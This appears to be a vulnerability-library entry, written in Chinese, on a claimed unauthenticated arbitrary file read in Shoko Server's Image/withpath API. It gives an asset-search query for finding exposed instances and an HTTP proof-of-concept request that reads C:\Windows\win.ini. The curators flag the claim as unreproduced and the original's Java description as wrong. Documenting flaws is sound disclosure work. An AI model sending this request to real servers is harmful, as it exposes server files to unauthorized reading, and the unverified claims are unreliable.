---
source: "wy876 漏洞文库"
title: "Shoko Server Image withpath绝对路径读取声称"
product: "Shoko Server"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows示例；版本未知"
prerequisites: "无鉴权请求，要求未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/xf0qp3zhll25buy9"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/ShokoServer/ShokoServerwithpath%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
id: "vw-6ce8f6dd94db03b10bc26be0"
entity_id: "ve-6ce8f6dd94db03b10bc26be0"
schema_version: "1"
---

# Shoko Server Image withpath绝对路径读取声称

## 条目说明

- 对象与具体问题：Shoko Server；Image withpath绝对路径读取声称
- 版本、配置及部署条件：Windows示例；版本未知
- 认证与权限前提：无鉴权请求，要求未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 简介称Java媒体服务器须核产品技术栈，不能据营销简介确定架构
- 只有win.ini请求，无响应、源码、鉴权/修复和Linux适用性证据
- 原始反斜杠URI依赖客户端规范化；HTTP错标Java

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
 Shoko Server 是一个基于 Java 的开源媒体服务器软件，旨在提供一个统一的媒体管理和流媒体解决方案。它支持多种媒体格式，包括视频、音频、图片等，能够对媒体文件进行索引、搜索、播放和流媒体等操作，ShokoServer 接口处存在任意文件读取漏洞，恶意攻击者可能利用该漏洞读取服务器上的敏感文件，例如客户记录、财务数据或源代码，导致数据泄露。 

## 二、影响版本
ShokoServer 

## 三、资产测绘
```plain
title="Shoko WEB UI"
```


## 四、漏洞复现
```http
GET /api/Image/withpath/C:\Windows\win.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xf0qp3zhll25buy9>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
